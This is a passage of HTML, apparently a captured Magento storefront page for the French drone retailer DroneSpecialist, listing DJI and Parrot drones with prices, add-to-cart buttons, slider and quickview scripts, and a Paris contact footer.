+                                                                                                                                    <button type="button" title="Ajouter au panier" class="button btn-cart" onclick="setLocation('http://www.dronespecialist.fr/checkout/cart/add/uenc/aHR0cDovL3d3dy5kcm9uZXNwZWNpYWxpc3QuZnIv/product/10/form_key/mIyfsnbmOUsA6EEt/')"><span><span>Ajouter au panier</span></span></button>
+                                                                                    					
+                                                                            </div>
+                                    				</div>
+																		</li>                    
+											<li class="featuredproductslider-item">
+                                    <a href="http://www.dronespecialist.fr/dji-s800-evo-a2-zenmuse-z15.html" title="DJI S800 EVO + A2 + Zenmuse Z15" class="product-image"><img src="http://www.dronespecialist.fr/media/catalog/product/cache/1/small_image/300x365/9df78eab33525d08d6e5fb8d27136e95/s/8/s800_evo_2_1.jpg" alt="DJI S800 EVO + A2 + Zenmuse Z15" /></a>
+                                <div class="products-inner">
+                                    <h2 class="product-name"><a href="http://www.dronespecialist.fr/dji-s800-evo-a2-zenmuse-z15.html" title="DJI S800 EVO + A2 + Zenmuse Z15">DJI S800 EVO + A2 + Zenmuse Z15</a></h2>
+                                                                                                                
+
+                
+    <div class="price-box">
+                                                            <span class="regular-price" id="product-price-12">
+                                            <span class="price">4 999,00 €</span>                                    </span>
+                        
+                <div class="de-label">
+			                    </div>
+    </div>
+
+                                                                        <div class="actions">
+					<a class="quickview-button" title="Quickview" rel="12" href="javascript:void(0);">
+    Quickview</a>
+
+
+                                                                                                                                    <button type="button" title="Ajouter au panier" class="button btn-cart" onclick="setLocation('http://www.dronespecialist.fr/checkout/cart/add/uenc/aHR0cDovL3d3dy5kcm9uZXNwZWNpYWxpc3QuZnIv/product/12/form_key/mIyfsnbmOUsA6EEt/')"><span><span>Ajouter au panier</span></span></button>
+                                                                                    					
+                                                                            </div>
+                                    				</div>
+																		</li>                    
+											<li class="featuredproductslider-item">
+                                    <a href="http://www.dronespecialist.fr/dji-s800-evo.html" title="s800" class="product-image"><img src="http://www.dronespecialist.fr/media/catalog/product/cache/1/small_image/300x365/9df78eab33525d08d6e5fb8d27136e95/s/8/s800_evo.jpg" alt="s800" /></a>
+                                <div class="products-inner">
+                                    <h2 class="product-name"><a href="http://www.dronespecialist.fr/dji-s800-evo.html" title="DJI S800 EVO">DJI S800 EVO</a></h2>
+                                                                                                                
+
+                
+    <div class="price-box">
+                                                            <span class="regular-price" id="product-price-15">
+                                            <span class="price">2 499,00 €</span>                                    </span>
+                        
+                <div class="de-label">
+			                    </div>
+    </div>
+
+                                                                        <div class="actions">
+					<a class="quickview-button" title="Quickview" rel="15" href="javascript:void(0);">
+    Quickview</a>
+
+
+                                                                                                                                    <button type="button" title="Ajouter au panier" class="button btn-cart" onclick="setLocation('http://www.dronespecialist.fr/checkout/cart/add/uenc/aHR0cDovL3d3dy5kcm9uZXNwZWNpYWxpc3QuZnIv/product/15/form_key/mIyfsnbmOUsA6EEt/')"><span><span>Ajouter au panier</span></span></button>
+                                                                                    					
+                                                                            </div>
+                                    				</div>
+																		</li>                    
+											<li class="featuredproductslider-item">
+                                    <a href="http://www.dronespecialist.fr/dji-phantom-arf.html" title="DJI Phantom ARF " class="product-image"><img src="http://www.dronespecialist.fr/media/catalog/product/cache/1/small_image/300x365/9df78eab33525d08d6e5fb8d27136e95/p/h/phantom1.png" alt="DJI Phantom ARF " /></a>
+                                <div class="products-inner">
+                                    <h2 class="product-name"><a href="http://www.dronespecialist.fr/dji-phantom-arf.html" title="DJI Phantom ARF ">DJI Phantom ARF </a></h2>
+                                                                                                                
+
+                
+    <div class="price-box">
+                                                            <span class="regular-price" id="product-price-19">
+                                            <span class="price">419,00 €</span>                                    </span>
+                        
+                <div class="de-label">
+			                    </div>
+    </div>
+
+                                                                        <div class="actions">
+					<a class="quickview-button" title="Quickview" rel="19" href="javascript:void(0);">
+    Quickview</a>
+
+
+                                                                                                                                    <button type="button" title="Ajouter au panier" class="button btn-cart" onclick="setLocation('http://www.dronespecialist.fr/checkout/cart/add/uenc/aHR0cDovL3d3dy5kcm9uZXNwZWNpYWxpc3QuZnIv/product/19/form_key/mIyfsnbmOUsA6EEt/')"><span><span>Ajouter au panier</span></span></button>
+                                                                                    					
+                                                                            </div>
+                                    				</div>
+																		</li>                    
+											<li class="featuredproductslider-item">
+                                    <a href="http://www.dronespecialist.fr/parrot-ar-drone-2-0-power-edition.html" title="ar drone 2.0 power edition" class="product-image"><img src="http://www.dronespecialist.fr/media/catalog/product/cache/1/small_image/300x365/9df78eab33525d08d6e5fb8d27136e95/p/e/pe_indoor_red_3658.jpg" alt="ar drone 2.0 power edition" /></a>
+                                <div class="products-inner">
+                                    <h2 class="product-name"><a href="http://www.dronespecialist.fr/parrot-ar-drone-2-0-power-edition.html" title="Parrot AR-Drone 2.0 Power Edition">Parrot AR-Drone 2.0 Power Edition</a></h2>
+                                                                                                                
+
+                
+    <div class="price-box">
+                                                            <span class="regular-price" id="product-price-22">
+                                            <span class="price">345,00 €</span>                                    </span>
+                        
+                <div class="de-label">
+			                    </div>
+    </div>
+
+                                                                        <div class="actions">
+					<a class="quickview-button" title="Quickview" rel="22" href="javascript:void(0);">
+    Quickview</a>
+
+
+                                                                                                                                    <button type="button" title="Ajouter au panier" class="button btn-cart" onclick="setLocation('http://www.dronespecialist.fr/checkout/cart/add/uenc/aHR0cDovL3d3dy5kcm9uZXNwZWNpYWxpc3QuZnIv/product/22/form_key/mIyfsnbmOUsA6EEt/')"><span><span>Ajouter au panier</span></span></button>
+                                                                                    					
+                                                                            </div>
+                                    				</div>
+																		</li>                    
+									</ul>
+
+                <script type="text/javascript">
+					$jq('.ma-featuredproductslider-container .flexslider').flexslider({
+												slideshow: false,
+												itemWidth: 200,
+						itemMargin: 15,
+						minItems: 2,
+						maxItems: 4,
+						slideshowSpeed: 3000,
+						animationSpeed: 600,
+												controlNav: false,
+																		animation: "slide"
+					});
+                </script>
+			</div>	
+		 
+	</div> 
+
+
+</div></div>
+	
+			
+<h2 style="text-align: center;"><h1>Drone Specialist,votre sp&eacute;cialiste en Drones</h1>
+<p>Bienvenue chez DroneSpecialist, votre site de r&eacute;f&eacute;rence en mati&egrave;re de Drones, Multi rotors et Quadricopt&egrave;res. Vous trouverez ici les meilleures marques tel que <a href="http://www.quadrocopterspecialist.nl/dji-quadrocopters.html">DJI Innovations</a> ,Walkera, AR Parrot et&nbsp; biens d'autres marques premium.</p>
+<p>Toutes les commandes pass&eacute;es avant 21.30 sont exp&eacute;di&eacute;es le jour m&ecirc;me si votre Drone est de stock ! Des Questions? N&rsquo;h&eacute;sitez pas &agrave; prendre <a href="http://www.dronespecialist.fr/contacts">contact</a> avec nous.</p></h2>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="footer-static-top-container">
+    <div class="footer-static-top row-fluid">
+        <div class="container">
+            <div class="container-inner">
+                            </div>
+        </div>
+    </div>
+</div>
+
+<div class="ma-footer-static-container">
+    <div class="footer-static row-fluid">
+        <div class="container">
+            <div class="container-inner">
+                <!--<div class="f-col f-col1 span3">
+<div class="footer-static-title">
+<h3>Contacts Us</h3>
+</div>
+<div class="footer-static-content">
+<p>No.8 Baria Street</p>
+<p>New York City</p>
+<ul class="address">
+<li>Call Us :
+<p>(024) 93 668 2236</p>
+</li>
+<li>Email:
+<p>contact@demo.com</p>
+</li>
+</ul>
+</div>
+</div>
+<div class="f-col f-col2 span3">
+<div class="footer-static-title">
+<h3>My Account</h3>
+</div>
+<div class="footer-static-content">
+<ul>
+<li class="first"><a href="http://www.dronespecialist.fr/about-magento-demo-store">About Us</a></li>
+<li><a href="http://www.dronespecialist.fr/privacy-policy-cookie-restriction-mode">Privacy Policy</a></li>
+<li><a href="http://www.dronespecialist.fr/customer/account">Your Account</a></li>
+<li><a href="http://www.dronespecialist.fr/customer/address">Address Book</a></li>
+<li><a href="http://www.dronespecialist.fr/review/customer">Product Reviews</a></li>
+</ul>
+</div>
+</div>
+<div class="f-col f-col3 span3">
+<div class="footer-static-title">
+<h3>Customer Service</h3>
+</div>
+<div class="footer-static-content">
+<ul>
+<li class="first"><a href="http://www.dronespecialist.fr/wishlist">My Wishlist</a></li>
+<li><a href="http://www.dronespecialist.fr/sales/order/history">My Order</a></li>
+<li><a href="http://www.dronespecialist.fr/sales/guest/form">Orders and Returns</a></li>
+<li><a href="http://www.dronespecialist.fr/contacts">Contacts</a></li>
+<li class="last"><a href="http://www.dronespecialist.fr/catalog/seo_sitemap/category">Site Map</a></li>
+</ul>
+</div>
+</div>
+<div class="f-col f-col4 span3">
+<div class="about-us">
+<div class="footer-static-title">
+<h3>Follow Us</h3>
+</div>
+<div class="footer-static-content"></div>
+</div>
+</div>-->
+<div class="f-col f-col1 span3">
+<div class="footer-static-title">
+<h3>Contact</h3>
+</div>
+<div class="footer-static-content">vous pouvez nous joindre au:
+<ul class="address">
+<li>
+<p>Email:&nbsp;&nbsp;&nbsp; <a href="mailto:info@dronespecialist.fr">info@dronespecialist.fr</a></p>
+</li>
+<li>
+<p><span id="result_box" class="short_text" lang="fr"><span class="hps">T&eacute;l&eacute;phone</span></span>: <strong>01.79.97.50.09</strong></p>
+</li>
+</ul>
+<p>9, rue du Quatre Septembre <br />75002 Paris<br /><br /></p>
+</div>
+</div>
+<div class="f-col f-col3 span3">
+<div class="footer-static-title">
+<h3>Service client&egrave;le</h3>
+</div>
+<div class="footer-static-content">
+<ul>
+<li class="first"><a href="http://www.dronespecialist.fr/wishlist">Ma liste de souhaits</a></li>
+<li><a href="http://www.dronespecialist.fr/sales/order/history">Ma commande</a></li>
+<li><a href="http://www.dronespecialist.fr/contacts">Contact</a></li>
+<li class="last"><a href="http://www.dronespecialist.fr/catalog/seo_sitemap/category">Plan du site</a></li>
+</ul>
+</div>
+</div>
+<div class="f-col f-col4 span3">
+<div class="about-us">&nbsp;</div>
+</div>            </div>
+        </div>
+    </div>
+</div>
+<div class="ma-footer-container">
+    <div class="container">
+        <div class="container-inner">
+            <div class="footer">
+                <div class="row-fluid">
+                    <div class="span4">
+                                            </div>
+                    <div class="span4">
+                        <address><!--Magento webwinkel door <A HREF="http://www.mage-company.nl" target="_blank">Mage-Company</A>--></address>
+                    </div>
+                    <div class="span4">
+					 						
+	  						
+                    </div>
+                </div>
+                <div id="back-top" class="hidden-phone">	</div>
+            </div>
+        </div>
+    </div>
+</div>
+        <div id="acp-overlay" class="ajaxcartpro-box-hide"></div><div id="ajaxcartpro-progress" class="ajaxcartpro-box-hide">
+            <img src="http://www.dronespecialist.fr/skin/frontend/default/webwinkelvoor/ajaxcartpro/images/al.gif" alt=""/>
+        <p>Veuillez patienter...</p>
+</div>
+<div id="ajaxcartpro-add-confirm" class="ajaxcartpro-box-hide">
+    
+<a class="aw-acp-continue focus">Continuer vos achats</a>
+<br />
+<a href="http://www.dronespecialist.fr/checkout/cart/" class="aw-acp-checkout">Voir le panier &amp; paiement</a>
+                </div>
+<div id="ajaxcartpro-remove-confirm" class="ajaxcartpro-box-hide">
+    
+<a class="aw-acp-continue focus">Continuer vos achats</a>
+<br />
+<a href="http://www.dronespecialist.fr/checkout/cart/" class="aw-acp-checkout">Voir le panier &amp; paiement</a>
+                </div>
+<div id="acp-configurable-block"></div>        <script type="text/javascript">
+        var loader     = new prototypeLoader('http://www.dronespecialist.fr/skin/frontend/default/webwinkelvoor/magentothem/quickview/images/ajax-loader.gif');
+        var quickview  = new Quickview({"media":"quickview_media_default","navigation":1,"overlay_show":1,"overlay_color":"#888888","overlay_opacity":0.7,"max_height":400}, 'aHR0cDovL3d3dy5kcm9uZXNwZWNpYWxpc3QuZnIv');
+        quickview.init();
+    </script>
+    <input type="hidden" id="base_url" value="http://www.dronespecialist.fr/" />
+
+    <div id="quickview-hider" onclick="quickview.close()" class="quickview-hider" style="display:none;background-color: #888888;opacity: 0.7;filter:progid:DXImageTransform.Microsoft.Alpha(opacity=70);-moz-opacity: 0.7;-khtml-opacity: 0.7;"></div>
+    <div id="popup" class="quickview-popup" style="display:none;"></div>
+    </div>
+</div>
+</body>
+</html>
